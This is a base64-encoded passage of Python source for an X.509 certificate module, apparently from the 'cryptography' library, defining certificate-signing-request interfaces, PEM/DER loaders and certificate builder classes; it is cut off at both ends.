mMuQUJDTWV0YSk6XHJcbiAgICBAYWJjLmFic3RyYWN0bWV0aG9kXHJcbiAgICBkZWYgX19lcV9fKHNlbGYsIG90aGVyOiBvYmplY3QpIC0+IGJvb2w6XHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgQ2hlY2tzIGVxdWFsaXR5LlxyXG4gICAgICAgICIiIlxyXG5cclxuICAgIEBhYmMuYWJzdHJhY3RtZXRob2RcclxuICAgIGRlZiBfX2hhc2hfXyhzZWxmKSAtPiBpbnQ6XHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgQ29tcHV0ZXMgYSBoYXNoLlxyXG4gICAgICAgICIiIlxyXG5cclxuICAgIEBhYmMuYWJzdHJhY3RtZXRob2RcclxuICAgIGRlZiBwdWJsaWNfa2V5KHNlbGYpIC0+IENFUlRJRklDQVRFX1BVQkxJQ19LRVlfVFlQRVM6XHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgUmV0dXJucyB0aGUgcHVibGljIGtleVxyXG4gICAgICAgICIiIlxyXG5cclxuICAgIEBhYmMuYWJzdHJhY3Rwcm9wZXJ0eVxyXG4gICAgZGVmIHN1YmplY3Qoc2VsZikgLT4gTmFtZTpcclxuICAgICAgICAiIiJcclxuICAgICAgICBSZXR1cm5zIHRoZSBzdWJqZWN0IG5hbWUgb2JqZWN0LlxyXG4gICAgICAgICIiIlxyXG5cclxuICAgIEBhYmMuYWJzdHJhY3Rwcm9wZXJ0eVxyXG4gICAgZGVmIHNpZ25hdHVyZV9oYXNoX2FsZ29yaXRobShcclxuICAgICAgICBzZWxmLFxyXG4gICAgKSAtPiB0eXBpbmcuT3B0aW9uYWxbaGFzaGVzLkhhc2hBbGdvcml0aG1dOlxyXG4gICAgICAgICIiIlxyXG4gICAgICAgIFJldHVybnMgYSBIYXNoQWxnb3JpdGhtIGNvcnJlc3BvbmRpbmcgdG8gdGhlIHR5cGUgb2YgdGhlIGRpZ2VzdCBzaWduZWRcclxuICAgICAgICBpbiB0aGUgY2VydGlmaWNhdGUuXHJcbiAgICAgICAgIiIiXHJcblxyXG4gICAgQGFiYy5hYnN0cmFjdHByb3BlcnR5XHJcbiAgICBkZWYgc2lnbmF0dXJlX2FsZ29yaXRobV9vaWQoc2VsZikgLT4gT2JqZWN0SWRlbnRpZmllcjpcclxuICAgICAgICAiIiJcclxuICAgICAgICBSZXR1cm5zIHRoZSBPYmplY3RJZGVudGlmaWVyIG9mIHRoZSBzaWduYXR1cmUgYWxnb3JpdGhtLlxyXG4gICAgICAgICIiIlxyXG5cclxuICAgIEBhYmMuYWJzdHJhY3Rwcm9wZXJ0eVxyXG4gICAgZGVmIGV4dGVuc2lvbnMoc2VsZikgLT4gRXh0ZW5zaW9uczpcclxuICAgICAgICAiIiJcclxuICAgICAgICBSZXR1cm5zIHRoZSBleHRlbnNpb25zIGluIHRoZSBzaWduaW5nIHJlcXVlc3QuXHJcbiAgICAgICAgIiIiXHJcblxyXG4gICAgQGFiYy5hYnN0cmFjdHByb3BlcnR5XHJcbiAgICBkZWYgYXR0cmlidXRlcyhzZWxmKSAtPiBBdHRyaWJ1dGVzOlxyXG4gICAgICAgICIiIlxyXG4gICAgICAgIFJldHVybnMgYW4gQXR0cmlidXRlcyBvYmplY3QuXHJcbiAgICAgICAgIiIiXHJcblxyXG4gICAgQGFiYy5hYnN0cmFjdG1ldGhvZFxyXG4gICAgZGVmIHB1YmxpY19ieXRlcyhzZWxmLCBlbmNvZGluZzogc2VyaWFsaXphdGlvbi5FbmNvZGluZykgLT4gYnl0ZXM6XHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgRW5jb2RlcyB0aGUgcmVxdWVzdCB0byBQRU0gb3IgREVSIGZvcm1hdC5cclxuICAgICAgICAiIiJcclxuXHJcbiAgICBAYWJjLmFic3RyYWN0cHJvcGVydHlcclxuICAgIGRlZiBzaWduYXR1cmUoc2VsZikgLT4gYnl0ZXM6XHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgUmV0dXJucyB0aGUgc2lnbmF0dXJlIGJ5dGVzLlxyXG4gICAgICAgICIiIlxyXG5cclxuICAgIEBhYmMuYWJzdHJhY3Rwcm9wZXJ0eVxyXG4gICAgZGVmIHRic19jZXJ0cmVxdWVzdF9ieXRlcyhzZWxmKSAtPiBieXRlczpcclxuICAgICAgICAiIiJcclxuICAgICAgICBSZXR1cm5zIHRoZSBQS0NTIzEwIENlcnRpZmljYXRpb25SZXF1ZXN0SW5mbyBieXRlcyBhcyBkZWZpbmVkIGluIFJGQ1xyXG4gICAgICAgIDI5ODYuXHJcbiAgICAgICAgIiIiXHJcblxyXG4gICAgQGFiYy5hYnN0cmFjdHByb3BlcnR5XHJcbiAgICBkZWYgaXNfc2lnbmF0dXJlX3ZhbGlkKHNlbGYpIC0+IGJvb2w6XHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgVmVyaWZpZXMgc2lnbmF0dXJlIG9mIHNpZ25pbmcgcmVxdWVzdC5cclxuICAgICAgICAiIiJcclxuXHJcbiAgICBAYWJjLmFic3RyYWN0bWV0aG9kXHJcbiAgICBkZWYgZ2V0X2F0dHJpYnV0ZV9mb3Jfb2lkKHNlbGYsIG9pZDogT2JqZWN0SWRlbnRpZmllcikgLT4gYnl0ZXM6XHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgR2V0IHRoZSBhdHRyaWJ1dGUgdmFsdWUgZm9yIGEgZ2l2ZW4gT0lELlxyXG4gICAgICAgICIiIlxyXG5cclxuXHJcbiMgUnVudGltZSBpc2luc3RhbmNlIGNoZWNrcyBuZWVkIHRoaXMgc2luY2UgdGhlIHJ1c3QgY2xhc3MgaXMgbm90IGEgc3ViY2xhc3MuXHJcbkNlcnRpZmljYXRlU2lnbmluZ1JlcXVlc3QucmVnaXN0ZXIocnVzdF94NTA5LkNlcnRpZmljYXRlU2lnbmluZ1JlcXVlc3QpXHJcblxyXG5cclxuIyBCYWNrZW5kIGFyZ3VtZW50IHByZXNlcnZlZCBmb3IgQVBJIGNvbXBhdGliaWxpdHksIGJ1dCBpZ25vcmVkLlxyXG5kZWYgbG9hZF9wZW1feDUwOV9jZXJ0aWZpY2F0ZShcclxuICAgIGRhdGE6IGJ5dGVzLCBiYWNrZW5kOiB0eXBpbmcuQW55ID0gTm9uZVxyXG4pIC0+IENlcnRpZmljYXRlOlxyXG4gICAgcmV0dXJuIHJ1c3RfeDUwOS5sb2FkX3BlbV94NTA5X2NlcnRpZmljYXRlKGRhdGEpXHJcblxyXG5cclxuIyBCYWNrZW5kIGFyZ3VtZW50IHByZXNlcnZlZCBmb3IgQVBJIGNvbXBhdGliaWxpdHksIGJ1dCBpZ25vcmVkLlxyXG5kZWYgbG9hZF9kZXJfeDUwOV9jZXJ0aWZpY2F0ZShcclxuICAgIGRhdGE6IGJ5dGVzLCBiYWNrZW5kOiB0eXBpbmcuQW55ID0gTm9uZVxyXG4pIC0+IENlcnRpZmljYXRlOlxyXG4gICAgcmV0dXJuIHJ1c3RfeDUwOS5sb2FkX2Rlcl94NTA5X2NlcnRpZmljYXRlKGRhdGEpXHJcblxyXG5cclxuIyBCYWNrZW5kIGFyZ3VtZW50IHByZXNlcnZlZCBmb3IgQVBJIGNvbXBhdGliaWxpdHksIGJ1dCBpZ25vcmVkLlxyXG5kZWYgbG9hZF9wZW1feDUwOV9jc3IoXHJcbiAgICBkYXRhOiBieXRlcywgYmFja2VuZDogdHlwaW5nLkFueSA9IE5vbmVcclxuKSAtPiBDZXJ0aWZpY2F0ZVNpZ25pbmdSZXF1ZXN0OlxyXG4gICAgcmV0dXJuIHJ1c3RfeDUwOS5sb2FkX3BlbV94NTA5X2NzcihkYXRhKVxyXG5cclxuXHJcbiMgQmFja2VuZCBhcmd1bWVudCBwcmVzZXJ2ZWQgZm9yIEFQSSBjb21wYXRpYmlsaXR5LCBidXQgaWdub3JlZC5cclxuZGVmIGxvYWRfZGVyX3g1MDlfY3NyKFxyXG4gICAgZGF0YTogYnl0ZXMsIGJhY2tlbmQ6IHR5cGluZy5BbnkgPSBOb25lXHJcbikgLT4gQ2VydGlmaWNhdGVTaWduaW5nUmVxdWVzdDpcclxuICAgIHJldHVybiBydXN0X3g1MDkubG9hZF9kZXJfeDUwOV9jc3IoZGF0YSlcclxuXHJcblxyXG4jIEJhY2tlbmQgYXJndW1lbnQgcHJlc2VydmVkIGZvciBBUEkgY29tcGF0aWJpbGl0eSwgYnV0IGlnbm9yZWQuXHJcbmRlZiBsb2FkX3BlbV94NTA5X2NybChcclxuICAgIGRhdGE6IGJ5dGVzLCBiYWNrZW5kOiB0eXBpbmcuQW55ID0gTm9uZVxyXG4pIC0+IENlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q6XHJcbiAgICByZXR1cm4gcnVzdF94NTA5LmxvYWRfcGVtX3g1MDlfY3JsKGRhdGEpXHJcblxyXG5cclxuIyBCYWNrZW5kIGFyZ3VtZW50IHByZXNlcnZlZCBmb3IgQVBJIGNvbXBhdGliaWxpdHksIGJ1dCBpZ25vcmVkLlxyXG5kZWYgbG9hZF9kZXJfeDUwOV9jcmwoXHJcbiAgICBkYXRhOiBieXRlcywgYmFja2VuZDogdHlwaW5nLkFueSA9IE5vbmVcclxuKSAtPiBDZXJ0aWZpY2F0ZVJldm9jYXRpb25MaXN0OlxyXG4gICAgcmV0dXJuIHJ1c3RfeDUwOS5sb2FkX2Rlcl94NTA5X2NybChkYXRhKVxyXG5cclxuXHJcbmNsYXNzIENlcnRpZmljYXRlU2lnbmluZ1JlcXVlc3RCdWlsZGVyOlxyXG4gICAgZGVmIF9faW5pdF9fKFxyXG4gICAgICAgIHNlbGYsXHJcbiAgICAgICAgc3ViamVjdF9uYW1lOiB0eXBpbmcuT3B0aW9uYWxbTmFtZV0gPSBOb25lLFxyXG4gICAgICAgIGV4dGVuc2lvbnM6IHR5cGluZy5MaXN0W0V4dGVuc2lvbltFeHRlbnNpb25UeXBlXV0gPSBbXSxcclxuICAgICAgICBhdHRyaWJ1dGVzOiB0eXBpbmcuTGlzdFtcclxuICAgICAgICAgICAgdHlwaW5nLlR1cGxlW09iamVjdElkZW50aWZpZXIsIGJ5dGVzLCB0eXBpbmcuT3B0aW9uYWxbaW50XV1cclxuICAgICAgICBdID0gW10sXHJcbiAgICApOlxyXG4gICAgICAgICIiIlxyXG4gICAgICAgIENyZWF0ZXMgYW4gZW1wdHkgWC41MDkgY2VydGlmaWNhdGUgcmVxdWVzdCAodjEpLlxyXG4gICAgICAgICIiIlxyXG4gICAgICAgIHNlbGYuX3N1YmplY3RfbmFtZSA9IHN1YmplY3RfbmFtZVxyXG4gICAgICAgIHNlbGYuX2V4dGVuc2lvbnMgPSBleHRlbnNpb25zXHJcbiAgICAgICAgc2VsZi5fYXR0cmlidXRlcyA9IGF0dHJpYnV0ZXNcclxuXHJcbiAgICBkZWYgc3ViamVjdF9uYW1lKHNlbGYsIG5hbWU6IE5hbWUpIC0+ICJDZXJ0aWZpY2F0ZVNpZ25pbmdSZXF1ZXN0QnVpbGRlciI6XHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgU2V0cyB0aGUgY2VydGlmaWNhdGUgcmVxdWVzdG9yXCdzIGRpc3Rpbmd1aXNoZWQgbmFtZS5cclxuICAgICAgICAiIiJcclxuICAgICAgICBpZiBub3QgaXNpbnN0YW5jZShuYW1lLCBOYW1lKTpcclxuICAgICAgICAgICAgcmFpc2UgVHlwZUVycm9yKCJFeHBlY3RpbmcgeDUwOS5OYW1lIG9iamVjdC4iKVxyXG4gICAgICAgIGlmIHNlbGYuX3N1YmplY3RfbmFtZSBpcyBub3QgTm9uZTpcclxuICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcigiVGhlIHN1YmplY3QgbmFtZSBtYXkgb25seSBiZSBzZXQgb25jZS4iKVxyXG4gICAgICAgIHJldHVybiBDZXJ0aWZpY2F0ZVNpZ25pbmdSZXF1ZXN0QnVpbGRlcihcclxuICAgICAgICAgICAgbmFtZSwgc2VsZi5fZXh0ZW5zaW9ucywgc2VsZi5fYXR0cmlidXRlc1xyXG4gICAgICAgIClcclxuXHJcbiAgICBkZWYgYWRkX2V4dGVuc2lvbihcclxuICAgICAgICBzZWxmLCBleHR2YWw6IEV4dGVuc2lvblR5cGUsIGNyaXRpY2FsOiBib29sXHJcbiAgICApIC0+ICJDZXJ0aWZpY2F0ZVNpZ25pbmdSZXF1ZXN0QnVpbGRlciI6XHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgQWRkcyBhbiBYLjUwOSBleHRlbnNpb24gdG8gdGhlIGNlcnRpZmljYXRlIHJlcXVlc3QuXHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgaWYgbm90IGlzaW5zdGFuY2UoZXh0dmFsLCBFeHRlbnNpb25UeXBlKTpcclxuICAgICAgICAgICAgcmFpc2UgVHlwZUVycm9yKCJleHRlbnNpb24gbXVzdCBiZSBhbiBFeHRlbnNpb25UeXBlIilcclxuXHJcbiAgICAgICAgZXh0ZW5zaW9uID0gRXh0ZW5zaW9uKGV4dHZhbC5vaWQsIGNyaXRpY2FsLCBleHR2YWwpXHJcbiAgICAgICAgX3JlamVjdF9kdXBsaWNhdGVfZXh0ZW5zaW9uKGV4dGVuc2lvbiwgc2VsZi5fZXh0ZW5zaW9ucylcclxuXHJcbiAgICAgICAgcmV0dXJuIENlcnRpZmljYXRlU2lnbmluZ1JlcXVlc3RCdWlsZGVyKFxyXG4gICAgICAgICAgICBzZWxmLl9zdWJqZWN0X25hbWUsXHJcbiAgICAgICAgICAgIHNlbGYuX2V4dGVuc2lvbnMgKyBbZXh0ZW5zaW9uXSxcclxuICAgICAgICAgICAgc2VsZi5fYXR0cmlidXRlcyxcclxuICAgICAgICApXHJcblxyXG4gICAgZGVmIGFkZF9hdHRyaWJ1dGUoXHJcbiAgICAgICAgc2VsZixcclxuICAgICAgICBvaWQ6IE9iamVjdElkZW50aWZpZXIsXHJcbiAgICAgICAgdmFsdWU6IGJ5dGVzLFxyXG4gICAgICAgICosXHJcbiAgICAgICAgX3RhZzogdHlwaW5nLk9wdGlvbmFsW19BU04xVHlwZV0gPSBOb25lLFxyXG4gICAgKSAtPiAiQ2VydGlmaWNhdGVTaWduaW5nUmVxdWVzdEJ1aWxkZXIiOlxyXG4gICAgICAgICIiIlxyXG4gICAgICAgIEFkZHMgYW4gWC41MDkgYXR0cmlidXRlIHdpdGggYW4gT0lEIGFuZCBhc3NvY2lhdGVkIHZhbHVlLlxyXG4gICAgICAgICIiIlxyXG4gICAgICAgIGlmIG5vdCBpc2luc3RhbmNlKG9pZCwgT2JqZWN0SWRlbnRpZmllcik6XHJcbiAgICAgICAgICAgIHJhaXNlIFR5cGVFcnJvcigib2lkIG11c3QgYmUgYW4gT2JqZWN0SWRlbnRpZmllciIpXHJcblxyXG4gICAgICAgIGlmIG5vdCBpc2luc3RhbmNlKHZhbHVlLCBieXRlcyk6XHJcbiAgICAgICAgICAgIHJhaXNlIFR5cGVFcnJvcigidmFsdWUgbXVzdCBiZSBieXRlcyIpXHJcblxyXG4gICAgICAgIGlmIF90YWcgaXMgbm90IE5vbmUgYW5kIG5vdCBpc2luc3RhbmNlKF90YWcsIF9BU04xVHlwZSk6XHJcbiAgICAgICAgICAgIHJhaXNlIFR5cGVFcnJvcigidGFnIG11c3QgYmUgX0FTTjFUeXBlIilcclxuXHJcbiAgICAgICAgX3JlamVjdF9kdXBsaWNhdGVfYXR0cmlidXRlKG9pZCwgc2VsZi5fYXR0cmlidXRlcylcclxuXHJcbiAgICAgICAgaWYgX3RhZyBpcyBub3QgTm9uZTpcclxuICAgICAgICAgICAgdGFnID0gX3RhZy52YWx1ZVxyXG4gICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgIHRhZyA9IE5vbmVcclxuXHJcbiAgICAgICAgcmV0dXJuIENlcnRpZmljYXRlU2lnbmluZ1JlcXVlc3RCdWlsZGVyKFxyXG4gICAgICAgICAgICBzZWxmLl9zdWJqZWN0X25hbWUsXHJcbiAgICAgICAgICAgIHNlbGYuX2V4dGVuc2lvbnMsXHJcbiAgICAgICAgICAgIHNlbGYuX2F0dHJpYnV0ZXMgKyBbKG9pZCwgdmFsdWUsIHRhZyldLFxyXG4gICAgICAgIClcclxuXHJcbiAgICBkZWYgc2lnbihcclxuICAgICAgICBzZWxmLFxyXG4gICAgICAgIHByaXZhdGVfa2V5OiBDRVJUSUZJQ0FURV9QUklWQVRFX0tFWV9UWVBFUyxcclxuICAgICAgICBhbGdvcml0aG06IHR5cGluZy5PcHRpb25hbFtoYXNoZXMuSGFzaEFsZ29yaXRobV0sXHJcbiAgICAgICAgYmFja2VuZDogdHlwaW5nLkFueSA9IE5vbmUsXHJcbiAgICApIC0+IENlcnRpZmljYXRlU2lnbmluZ1JlcXVlc3Q6XHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgU2lnbnMgdGhlIHJlcXVlc3QgdXNpbmcgdGhlIHJlcXVlc3RvclwncyBwcml2YXRlIGtleS5cclxuICAgICAgICAiIiJcclxuICAgICAgICBpZiBzZWxmLl9zdWJqZWN0X25hbWUgaXMgTm9uZTpcclxuICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcigiQSBDZXJ0aWZpY2F0ZVNpZ25pbmdSZXF1ZXN0IG11c3QgaGF2ZSBhIHN1YmplY3QiKVxyXG4gICAgICAgIHJldHVybiBydXN0X3g1MDkuY3JlYXRlX3g1MDlfY3NyKHNlbGYsIHByaXZhdGVfa2V5LCBhbGdvcml0aG0pXHJcblxyXG5cclxuY2xhc3MgQ2VydGlmaWNhdGVCdWlsZGVyOlxyXG4gICAgX2V4dGVuc2lvbnM6IHR5cGluZy5MaXN0W0V4dGVuc2lvbltFeHRlbnNpb25UeXBlXV1cclxuXHJcbiAgICBkZWYgX19pbml0X18oXHJcbiAgICAgICAgc2VsZixcclxuICAgICAgICBpc3N1ZXJfbmFtZTogdHlwaW5nLk9wdGlvbmFsW05hbWVdID0gTm9uZSxcclxuICAgICAgICBzdWJqZWN0X25hbWU6IHR5cGluZy5PcHRpb25hbFtOYW1lXSA9IE5vbmUsXHJcbiAgICAgICAgcHVibGljX2tleTogdHlwaW5nLk9wdGlvbmFsW0NFUlRJRklDQVRFX1BVQkxJQ19LRVlfVFlQRVNdID0gTm9uZSxcclxuICAgICAgICBzZXJpYWxfbnVtYmVyOiB0eXBpbmcuT3B0aW9uYWxbaW50XSA9IE5vbmUsXHJcbiAgICAgICAgbm90X3ZhbGlkX2JlZm9yZTogdHlwaW5nLk9wdGlvbmFsW2RhdGV0aW1lLmRhdGV0aW1lXSA9IE5vbmUsXHJcbiAgICAgICAgbm90X3ZhbGlkX2FmdGVyOiB0eXBpbmcuT3B0aW9uYWxbZGF0ZXRpbWUuZGF0ZXRpbWVdID0gTm9uZSxcclxuICAgICAgICBleHRlbnNpb25zOiB0eXBpbmcuTGlzdFtFeHRlbnNpb25bRXh0ZW5zaW9uVHlwZV1dID0gW10sXHJcbiAgICApIC0+IE5vbmU6XHJcbiAgICAgICAgc2VsZi5fdmVyc2lvbiA9IFZlcnNpb24udjNcclxuICAgICAgICBzZWxmLl9pc3N1ZXJfbmFtZSA9IGlzc3Vlcl9uYW1lXHJcbiAgICAgICAgc2VsZi5fc3ViamVjdF9uYW1lID0gc3ViamVjdF9uYW1lXHJcbiAgICAgICAgc2VsZi5fcHVibGljX2tleSA9IHB1YmxpY19rZXlcclxuICAgICAgICBzZWxmLl9zZXJpYWxfbnVtYmVyID0gc2VyaWFsX251bWJlclxyXG4gICAgICAgIHNlbGYuX25vdF92YWxpZF9iZWZvcmUgPSBub3RfdmFsaWRfYmVmb3JlXHJcbiAgICAgICAgc2VsZi5fbm90X3ZhbGlkX2FmdGVyID0gbm90X3ZhbGlkX2FmdGVyXHJcbiAgICAgICAgc2VsZi5fZXh0ZW5zaW9ucyA9IGV4dGVuc2lvbnNcclxuXHJcbiAgICBkZWYgaXNzdWVyX25hbWUoc2VsZiwgbmFtZTogTmFtZSkgLT4gIkNlcnRpZmljYXRlQnVpbGRlciI6XHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgU2V0cyB0aGUgQ0FcJ3MgZGlzdGluZ3Vpc2hlZCBuYW1lLlxyXG4gICAgICAgICIiIlxyXG4gICAgICAgIGlmIG5vdCBpc2luc3RhbmNlKG5hbWUsIE5hbWUpOlxyXG4gICAgICAgICAgICByYWlzZSBUeXBlRXJyb3IoIkV4cGVjdGluZyB4NTA5Lk5hbWUgb2JqZWN0LiIpXHJcbiAgICAgICAgaWYgc2VsZi5faXNzdWVyX25hbWUgaXMgbm90IE5vbmU6XHJcbiAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoIlRoZSBpc3N1ZXIgbmFtZSBtYXkgb25seSBiZSBzZXQgb25jZS4iKVxyXG4gICAgICAgIHJldHVybiBDZXJ0aWZpY2F0ZUJ1aWxkZXIoXHJcbiAgICAgICAgICAgIG5hbWUsXHJcbiAgICAgICAgICAgIHNlbGYuX3N1YmplY3RfbmFtZSxcclxuICAgICAgICAgICAgc2VsZi5fcHVibGljX2tleSxcclxuICAgICAgICAgICAgc2VsZi5fc2VyaWFsX251bWJlcixcclxuICAgICAgICAgICAgc2VsZi5fbm90X3ZhbGlkX2JlZm9yZSxcclxuICAgICAgICAgICAgc2VsZi5fbm90X3ZhbGlkX2FmdGVyLFxyXG4gICAgICAgICAgICBzZWxmLl9leHRlbnNpb25zLFxyXG4gICAgICAgIClcclxuXHJcbiAgICBkZWYgc3ViamVjdF9uYW1lKHNlbGYsIG5hbWU6IE5hbWUpIC0+ICJDZXJ0aWZpY2F0ZUJ1aWxkZXIiOlxyXG4gICAgICAgICIiIlxyXG4gICAgICAgIFNldHMgdGhlIHJlcXVlc3RvclwncyBkaXN0aW5ndWlzaGVkIG5hbWUuXHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgaWYgbm90IGlzaW5zdGFuY2UobmFtZSwgTmFtZSk6XHJcbiAgICAgICAgICAgIHJhaXNlIFR5cGVFcnJvcigiRXhwZWN0aW5nIHg1MDkuTmFtZSBvYmplY3QuIilcclxuICAgICAgICBpZiBzZWxmLl9zdWJqZWN0X25hbWUgaXMgbm90IE5vbmU6XHJcbiAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoIlRoZSBzdWJqZWN0IG5hbWUgbWF5IG9ubHkgYmUgc2V0IG9uY2UuIilcclxuICAgICAgICByZXR1cm4gQ2VydGlmaWNhdGVCdWlsZGVyKFxyXG4gICAgICAgICAgICBzZWxmLl9pc3N1ZXJfbmFtZSxcclxuICAgICAgICAgICAgbmFtZSxcclxuICAgICAgICAgICAgc2VsZi5fcHVibGljX2tleSxcclxuICAgICAgICAgICAgc2VsZi5fc2VyaWFsX251bWJlcixcclxuICAgICAgICAgICAgc2VsZi5fbm90X3ZhbGlkX2JlZm9yZSxcclxuICAgICAgICAgICAgc2VsZi5fbm90X3ZhbGlkX2FmdGVyLFxyXG4gICAgICAgICAgICBzZWxmLl9leHRlbnNpb25zLFxyXG4gICAgICAgIClcclxuXHJcbiAgICBkZWYgcHVibGljX2tleShcclxuICAgICAgICBzZWxmLFxyXG4gICAgICAgIGtleTogQ0VSVElGSUNBVEVfUFVCTElDX0tFWV9UWVBFUyxcclxuICAgICkgLT4gIkNlcnRpZmljYXRlQnVpbGRlciI6XHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgU2V0cyB0aGUgcmVxdWVzdG9yXCdzIHB1YmxpYyBrZXkgKGFzIGZvdW5kIGluIHRoZSBzaWduaW5nIHJlcXVlc3QpLlxyXG4gICAgICAgICIiIlxyXG4gICAgICAgIGlmIG5vdCBpc2luc3RhbmNlKFxyXG4gICAgICAgICAgICBrZXksXHJcbiAgICAgICAgICAgIChcclxuICAgICAgICAgICAgICAgIGRzYS5EU0FQdWJsaWNLZXksXHJcbiAgICAgICAgICAgICAgICByc2EuUlNBUHVibGljS2V5LFxyXG4gICAgICAgICAgICAgICAgZWMuRWxsaXB0aWNDdXJ2ZVB1YmxpY0tleSxcclxuICAgICAgICAgICAgICAgIGVkMjU1MTkuRWQyNTUxOVB1YmxpY0tleSxcclxuICAgICAgICAgICAgICAgIGVkNDQ4LkVkNDQ4UHVibGljS2V5LFxyXG4gICAgICAgICAgICAgICAgeDI1NTE5LlgyNTUxOVB1YmxpY0tleSxcclxuICAgICAgICAgICAgICAgIHg0NDguWDQ0OFB1YmxpY0tleSxcclxuICAgICAgICAgICAgKSxcclxuICAgICAgICApOlxyXG4gICAgICAgICAgICByYWlzZSBUeXBlRXJyb3IoXHJcbiAgICAgICAgICAgICAgICAiRXhwZWN0aW5nIG9uZSBvZiBEU0FQdWJsaWNLZXksIFJTQVB1YmxpY0tleSwiXHJcbiAgICAgICAgICAgICAgICAiIEVsbGlwdGljQ3VydmVQdWJsaWNLZXksIEVkMjU1MTlQdWJsaWNLZXksIlxyXG4gICAgICAgICAgICAgICAgIiBFZDQ0OFB1YmxpY0tleSwgWDI1NTE5UHVibGljS2V5LCBvciAiXHJcbiAgICAgICAgICAgICAgICAiWDQ0OFB1YmxpY0tleS4iXHJcbiAgICAgICAgICAgIClcclxuICAgICAgICBpZiBzZWxmLl9wdWJsaWNfa2V5IGlzIG5vdCBOb25lOlxyXG4gICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKCJUaGUgcHVibGljIGtleSBtYXkgb25seSBiZSBzZXQgb25jZS4iKVxyXG4gICAgICAgIHJldHVybiBDZXJ0aWZpY2F0ZUJ1aWxkZXIoXHJcbiAgICAgICAgICAgIHNlbGYuX2lzc3Vlcl9uYW1lLFxyXG4gICAgICAgICAgICBzZWxmLl9zdWJqZWN0X25hbWUsXHJcbiAgICAgICAgICAgIGtleSxcclxuICAgICAgICAgICAgc2VsZi5fc2VyaWFsX251bWJlcixcclxuICAgICAgICAgICAgc2VsZi5fbm90X3ZhbGlkX2JlZm9yZSxcclxuICAgICAgICAgICAgc2VsZi5fbm90X3ZhbGlkX2FmdGVyLFxyXG4gICAgICAgICAgICBzZWxmLl9leHRlbnNpb25zLFxyXG4gICAgICAgIClcclxuXHJcbiAgICBkZWYgc2VyaWFsX251bWJlcihzZWxmLCBudW1iZXI6IGludCkgLT4gIkNlcnRpZmljYXRlQnVpbGRlciI6XHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgU2V0cyB0aGUgY2VydGlmaWNhdGUgc2VyaWFsIG51bWJlci5cclxuICAgICAgICAiIiJcclxuICAgICAgICBpZiBub3QgaXNpbnN0YW5jZShudW1iZXIsIGludCk6XHJcbiAgICAgICAgICAgIHJhaXNlIFR5cGVFcnJvcigiU2VyaWFsIG51bWJlciBtdXN0IGJlIG9mIGludGVncmFsIHR5cGUuIilcclxuICAgICAgICBpZiBzZWxmLl9zZXJpYWxfbnVtYmVyIGlzIG5vdCBOb25lOlxyXG4gICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKCJUaGUgc2VyaWFsIG51bWJlciBtYXkgb25seSBiZSBzZXQgb25jZS4iKVxyXG4gICAgICAgIGlmIG51bWJlciA8PSAwOlxyXG4gICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKCJUaGUgc2VyaWFsIG51bWJlciBzaG91bGQgYmUgcG9zaXRpdmUuIilcclxuXHJcbiAgICAgICAgIyBBU04uMSBpbnRlZ2VycyBhcmUgYWx3YXlzIHNpZ25lZCwgc28gbW9zdCBzaWduaWZpY2FudCBiaXQgbXVzdCBiZVxyXG4gICAgICAgICMgemVyby5cclxuICAgICAgICBpZiBudW1iZXIuYml0X2xlbmd0aCgpID49IDE2MDogICMgQXMgZGVmaW5lZCBpbiBSRkMgNTI4MFxyXG4gICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKFxyXG4gICAgICAgICAgICAgICAgIlRoZSBzZXJpYWwgbnVtYmVyIHNob3VsZCBub3QgYmUgbW9yZSB0aGFuIDE1OSAiICJiaXRzLiJcclxuICAgICAgICAgICAgKVxyXG4gICAgICAgIHJldHVybiBDZXJ0aWZpY2F0ZUJ1aWxkZXIoXHJcbiAgICAgICAgICAgIHNlbGYuX2lzc3Vlcl9uYW1lLFxyXG4gICAgICAgICAgICBzZWxmLl9zdWJqZWN0X25hbWUsXHJcbiAgICAgICAgICAgIHNlbGYuX3B1YmxpY19rZXksXHJcbiAgICAgICAgICAgIG51bWJlcixcclxuICAgICAgICAgICAgc2VsZi5fbm90X3ZhbGlkX2JlZm9yZSxcclxuICAgICAgICAgICAgc2VsZi5fbm90X3ZhbGlkX2FmdGVyLFxyXG4gICAgICAgICAgICBzZWxmLl9leHRlbnNpb25zLFxyXG4gICAgICAgIClcclxuXHJcbiAgICBkZWYgbm90X3ZhbGlkX2JlZm9yZShcclxuICAgICAgICBzZWxmLCB0aW1lOiBkYXRldGltZS5kYXRldGltZVxyXG4gICAgKSAtPiAiQ2VydGlmaWNhdGVCdWlsZGVyIjpcclxuICAgICAgICAiIiJcclxuICAgICAgICBTZXRzIHRoZSBjZXJ0aWZpY2F0ZSBhY3RpdmF0aW9uIHRpbWUuXHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgaWYgbm90IGlzaW5zdGFuY2UodGltZSwgZGF0ZXRpbWUuZGF0ZXRpbWUpOlxyXG4gICAgICAgICAgICByYWlzZSBUeXBlRXJyb3IoIkV4cGVjdGluZyBkYXRldGltZSBvYmplY3QuIilcclxuICAgICAgICBpZiBzZWxmLl9ub3RfdmFsaWRfYmVmb3JlIGlzIG5vdCBOb25lOlxyXG4gICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKCJUaGUgbm90IHZhbGlkIGJlZm9yZSBtY